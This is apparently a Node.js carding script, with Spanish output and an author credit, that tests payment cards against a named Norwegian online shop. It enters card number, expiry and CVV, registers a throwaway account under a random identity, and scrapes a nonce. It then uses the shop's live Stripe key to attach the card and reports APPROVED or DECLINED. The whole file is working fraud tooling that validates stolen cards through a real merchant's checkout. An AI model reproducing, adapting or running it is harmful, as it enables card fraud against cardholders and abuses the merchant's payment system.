const axios = require('axios');
const readline = require('readline');
const cheerio = require('cheerio');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

console.log("SCRIPT DESARROLLADO POR @IMPOVZITO");

rl.question("CC|MM|AA|CVV: ", async (tarjeta_input) => {
  try {
    let [cc, mes, ano, cvv] = tarjeta_input.split("|");

    // Validations
    if (cc.length < 13 || cc.length > 19 || isNaN(cc)) {
      throw new Error("El número de tarjeta (CC) debe tener entre 13 y 19 dígitos.");
    }
    if (isNaN(mes) || parseInt(mes) < 1 || parseInt(mes) > 12) {
      throw new Error("El mes (MES) debe ser un número entre 01 y 12.");
    }
    if (isNaN(ano) || (ano.length !== 2 && ano.length !== 4)) {
      throw new Error("El año (AÑO) debe tener 2 o 4 dígitos.");
    }
    if (ano.length === 4) {
      ano = ano.substring(2); // Convert 2025 -> 25
    }
    if (isNaN(cvv) || (cvv.length !== 3 && cvv.length !== 4)) {
      throw new Error("El CVV debe tener 3 o 4 dígitos.");
    }

    // Fetch random user data
    const randomUserUrl = "https://randomuser.me/api/?results=1&nat=US";
    const randomUserResponse = await axios.get(randomUserUrl);
    const userInfo = randomUserResponse.data.results[0];
    const email = userInfo.email;
    const zipcode = userInfo.location.postcode;

    // Create a session with cookies (simulated in Node.js with axios)
    const session = axios.create({
      withCredentials: true,
    });

    // URL of the page
    const url = "https://www.scandictech.no/my-account/";

    const data = {
      "email": email,
      "wc_order_attribution_source_type": "referral",
      "wc_order_attribution_referrer": "https://web.telegram.org/",
      "wc_order_attribution_utm_campaign": "(none)",
      "wc_order_attribution_utm_source": "web.telegram.org",
      "wc_order_attribution_utm_medium": "referral",
      "wc_order_attribution_utm_content": "/",
      "wc_order_attribution_utm_id": "(none)",
      "wc_order_attribution_utm_term": "(none)",
      "wc_order_attribution_utm_source_platform": "(none)",
      "wc_order_attribution_utm_creative_format": "(none)",
      "wc_order_attribution_utm_marketing_tactic": "(none)",
      "wc_order_attribution_session_entry": "https://www.scandictech.no/",
      "wc_order_attribution_session_start_time": "2025-05-02 02:22:31",
      "wc_order_attribution_session_pages": "13",
      "wc_order_attribution_session_count": "1",
      "wc_order_attribution_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
      "woocommerce-register-nonce": "aef6c11c3b",
      "_wp_http_referer": "/my-account/",
      "register": "Register"
    };

    const headers = {
      "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
      "accept-encoding": "gzip, deflate, br, zstd",
      "accept-language": "en-US,en;q=0.7",
      "cache-control": "max-age=0",
      "content-type": "application/x-www-form-urlencoded",
      "origin": "https://www.scandictech.no",
      "referer": "https://www.scandictech.no/my-account/",
      "sec-ch-ua": '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "document",
      "sec-fetch-mode": "navigate",
      "sec-fetch-site": "same-origin",
      "sec-fetch-user": "?1",
      "sec-gpc": "1",
      "upgrade-insecure-requests": "1",
      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
    };

    const postResponse = await session.post(url, new URLSearchParams(data).toString(), { headers });

    // Get the add-payment-method page
    const addPaymentMethodUrl = "https://www.scandictech.no/my-account/add-payment-method/";
    const addPaymentMethodResponse = await session.get(addPaymentMethodUrl, { headers });

    // Extract the nonce
    const $ = cheerio.load(addPaymentMethodResponse.data);
    let nonce = null;
    $('script').each((index, script) => {
      const scriptContent = $(script).html();
      if (scriptContent && scriptContent.includes("createAndConfirmSetupIntentNonce")) {
        const start = scriptContent.indexOf("createAndConfirmSetupIntentNonce") + "createAndConfirmSetupIntentNonce".length + 3;
        const end = scriptContent.indexOf('"', start);
        nonce = scriptContent.substring(start, end);
      }
    });

    if (!nonce) throw new Error("Nonce not found");

    // Make the POST request to Stripe
    const stripeUrl = "https://m.stripe.com/6";
    const stripeResponse = await session.post(stripeUrl, {}, { headers });

    const stripeJson = stripeResponse.data;
    const guid = stripeJson.guid || '';
    const muid = stripeJson.muid || '';
    const sid = stripeJson.sid || '';

    // Stripe payment method creation
    const paymentMethodsUrl = "https://api.stripe.com/v1/payment_methods";
    const paymentMethodsData = new URLSearchParams({
      "type": "card",
      "card[number]": cc,
      "card[cvc]": cvv,
      "card[exp_year]": ano,
      "card[exp_month]": mes,
      "allow_redisplay": "unspecified",
      "billing_details[address][postal_code]": zipcode,
      "billing_details[address][country]": "US",
      "pasted_fields": "number",
      "payment_user_agent": "stripe.js/e01db0f08f; stripe-js-v3/e01db0f08f; payment-element; deferred-intent",
      "referrer": "https://www.scandictech.no",
      "time_on_page": "67182",
      "client_attribution_metadata[client_session_id]": "7cbca304-99b4-4e6f-a571-b689a496a462",
      "client_attribution_metadata[merchant_integration_source]": "elements",
      "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
      "client_attribution_metadata[merchant_integration_version]": "2021",
      "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
      "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
      "guid": guid,
      "muid": muid,
      "sid": sid,
      "key": "pk_live_51CAQ12Ch1v99O5ajYxDe9RHvH4v7hfoutP2lmkpkGOwx5btDAO6HDrYStP95KmqkxZro2cUJs85TtFsTtB75aV2G00F87TR6yf",
      "_stripe_version": "2024-06-20",
    }).toString();

    const paymentMethodsResponse = await session.post(paymentMethodsUrl, paymentMethodsData, {
      headers: {
        ...headers,
        "accept": "application/json",
        "content-length": paymentMethodsData.length,
      },
    });

    const paymentMethodsJson = paymentMethodsResponse.data;
    const paymentMethodId = paymentMethodsJson.id;

    const confirmSetupIntentUrl = "https://www.scandictech.no/?wc-ajax=wc_stripe_create_and_confirm_setup_intent";
    const confirmSetupIntentData = new URLSearchParams({
      "action": "create_and_confirm_setup_intent",
      "wc-stripe-payment-method": paymentMethodId,
      "wc-stripe-payment-type": "card",
      "_ajax_nonce": nonce,
    }).toString();

    const confirmSetupIntentResponse = await session.post(confirmSetupIntentUrl, confirmSetupIntentData, { headers });

    const responseJson = confirmSetupIntentResponse.data;

    if (responseJson.success === false) {
      const errorMessage = responseJson.data.error.message || "Unknown error";
      console.log(`${tarjeta_input} , STATUS : ${errorMessage.includes("incorrect_address") ? "APPROVED AVS ✅" : "DECLINED ❌"} , MESSAGE : ${errorMessage} ❌`);
    } else if (responseJson.success === true) {
      const status = responseJson.data.status || "unknown";
      if (status === "requires_action") {
        console.log(`${tarjeta_input} , STATUS : APPROVED 3D ✅ , MESSAGE : ${status} ❌`);
      } else {
        console.log(`${tarjeta_input} , STATUS : APPROVED ✅ , MESSAGE : ${status} ✅`);
      }
    } else {
      console.log(`${tarjeta_input} , STATUS : UNKNOWN ❌ , MESSAGE : Respuesta inesperada del servidor.`);
    }

  } catch (err) {
    console.error(`Error: ${err.message}`);
  } finally {
    rl.close();
  }
});
